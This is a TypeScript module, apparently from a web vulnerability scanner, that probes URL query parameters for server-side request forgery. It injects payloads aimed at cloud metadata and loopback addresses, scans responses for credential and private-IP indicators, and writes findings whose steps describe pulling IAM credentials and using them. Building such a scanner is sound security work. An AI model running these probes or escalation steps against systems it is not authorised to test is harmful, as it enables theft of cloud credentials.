import { fetchUrl } from '../utils/http-client.js';
import { buildFinding, getQueryParamNames } from '../stages/stage-utils.js';
import type { Finding } from '../types.js';
import type { SessionManager } from './session-manager.js';

export interface SsrfProbeOptions {
  timeoutMs?: number;
  session?:   SessionManager;
}

const SSRF_PAYLOADS = [
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/metadata/instance',
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://100.100.100.200/latest/meta-data/',
  'http://localhost/',
  'http://127.0.0.1/',
  'http://0.0.0.0/',
  'http://[::1]/',
];

const SSRF_BODY_INDICATORS: RegExp[] = [
  /ami-id/i,
  /instance-id/i,
  /instance-type/i,
  /local-ipv4/i,
  /computeMetadata/,
  /serviceAccounts/i,
  /iam\/security-credentials/i,
  /AccessKeyId/i,
  /SecretAccessKey/i,
  /Token.*expiration/i,
  /\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/,
  /\b172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}\b/,
  /\b192\.168\.\d{1,3}\.\d{1,3}\b/,
];

function containsSsrfIndicator(body: string): string | null {
  for (const pattern of SSRF_BODY_INDICATORS) {
    const match = body.match(pattern);
    if (match) return match[0];
  }
  return null;
}

function buildSsrfFinding(
  urlStr: string, host: string, path: string,
  param: string, payload: string,
  indicator: string, status: number
): Finding {
  return buildFinding({
    host, path, url: urlStr,
    severity:       'critical',
    category:       'injection',
    title:          `SSRF Confirmed — Parameter: ${param}`,
    description:
      `Server-Side Request Forgery confirmed in parameter '${param}'. ` +
      `The payload '${payload}' caused the server to make an internal HTTP request ` +
      `and return its response. The indicator '${indicator}' was found in the body, ` +
      `suggesting cloud instance metadata or internal network access.`,
    evidence:
      `Payload: ${payload} | HTTP status: ${status} | ` +
      `Indicator in response body: '${indicator}'`,
    exploitability: 97,
    reproductionSteps: [
      `1. Set ${param}=${payload} in: ${urlStr}`,
      '2. Response body contains internal metadata or private IP address.',
      '3. Escalate: fetch IAM credentials from http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      '4. Use leaked credentials to access cloud resources.',
    ],
    remediationHint:
      'Validate and allowlist URL destinations server-side. ' +
      'Block requests to RFC-1918 addresses and cloud metadata endpoints at the network layer. ' +
      'Disable IMDSv1 on AWS; require IMDSv2 with session tokens.',
    source:   'differential',
    verified: true,
  });
}

export async function runSsrfProbe(
  urlStr: string,
  opts: SsrfProbeOptions = {}
): Promise<Finding[]> {
  const { timeoutMs = 7_000, session } = opts;
  const findings: Finding[] = [];
  const params = getQueryParamNames(urlStr);
  if (params.length === 0) return findings;

  let host = '';
  let path = '/';
  try {
    const u = new URL(urlStr);
    host = u.hostname;
    path = u.pathname;
  } catch {
    return findings;
  }

  const headers = session?.buildHeaders() ?? {};

  for (const param of params) {
    for (const payload of SSRF_PAYLOADS) {
      const probeUrl = injectParam(urlStr, param, payload);
      const resp = await fetchUrl(probeUrl, { method: 'GET', headers, timeoutMs }).catch(() => null);
      if (!resp || resp.error || resp.status === 0) continue;

      const indicator = containsSsrfIndicator(resp.body);
      if (indicator) {
        findings.push(buildSsrfFinding(urlStr, host, path, param, payload, indicator, resp.status));
        break;
      }
    }
  }

  return findings;
}

function injectParam(urlStr: string, param: string, value: string): string {
  try {
    const u = new URL(urlStr);
    u.searchParams.set(param, value);
    return u.toString();
  } catch {
    return urlStr;
  }
}
